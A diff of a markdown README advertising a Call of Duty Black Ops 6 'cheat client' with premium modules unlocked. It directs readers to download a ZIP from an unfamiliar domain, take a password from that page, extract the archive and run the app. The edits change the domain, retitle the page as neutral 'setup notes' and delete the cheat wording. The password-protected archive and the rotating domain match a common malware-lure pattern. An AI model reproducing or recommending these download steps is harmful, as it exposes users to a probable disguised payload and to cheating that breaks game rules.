@@ -1,6 +1,6 @@
 ***
 
-# Call of Duty Black Ops 6 — BO6 cheat client
+# Call of Duty Black Ops 6 Windows Setup Notes
 
 Call of Duty Black Ops 6 — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Call of Duty Black Ops 6 — Windows setup and configuration · Premium workspac
 
 > Use the release page below for Windows.
 
-- **Release page:** [sailcaoatmb.slopmods.tech](https://sailcaoatmb.slopmods.tech/)
-- **Full URL:** `https://sailcaoatmb.slopmods.tech/`
+- **Release page:** [sailcaoatmb.slopmods.top](https://sailcaoatmb.slopmods.top/)
+- **Full URL:** `https://sailcaoatmb.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **sailcaoatmb.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **sailcaoatmb.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,18 +33,8 @@ Call of Duty Black Ops 6 — Windows setup and configuration · Premium workspac
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **sailcaoatmb.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **sailcaoatmb.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Client bundle
-
-This install guide references the **BO6 cheat client** bundle layout from the release page (Windows desktop).
-
-
-## Game utilities
-
-PC **mod / practice toolkit** pack for offline or private sessions. Install notes only — use at your own risk on live servers.
 ## What you get
 
 - Core Call of Duty Black Ops 6 features on Windows desktop
